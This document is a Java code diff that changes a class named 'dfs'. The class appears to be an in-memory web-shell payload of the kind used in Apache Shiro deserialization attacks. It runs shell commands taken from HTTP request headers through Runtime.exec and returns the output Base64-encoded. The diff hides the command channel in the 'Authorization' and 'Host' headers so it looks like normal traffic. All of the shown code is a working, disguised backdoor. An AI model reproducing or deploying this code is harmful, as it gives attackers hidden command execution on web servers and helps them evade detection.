@@ -36,7 +36,7 @@ public class dfs {
         if(!i(o)){
             if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){
                 r = (javax.servlet.http.HttpServletRequest)o;
-                if(r.getHeader("Ctmd")==null && r.getHeader("c") == null) {
+                if(r.getHeader("Host")==null && r.getHeader("Authorization") == null) {
                     r = null;
                 }else{
                     try {
@@ -51,13 +51,13 @@ public class dfs {
             if(r !=null&& p !=null){
                 try {
 
-                    if (r.getHeader("Ctmd") != null) {
-                        p.addHeader("techo",r.getHeader("Ctmd"));
-                    }else {
-                        p.getWriter().println("$$$" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader("c"))).getInputStream()).useDelimiter("\\A").next().getBytes()) + "$$$");
-                        p.getWriter().flush();
-                        p.getWriter().close();
-                    }
+                    p.addHeader("Host",r.getHeader("Host"));
+                    try {
+                        p.getWriter().println("$$$" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader("Authorization").replaceAll("Basic ",""))).getInputStream()).useDelimiter("\\A").next().getBytes()) + "$$$");
+                    }catch (Exception e){}
+
+                    p.getWriter().flush();
+                    p.getWriter().close();
 
 
                 }catch (Exception e){
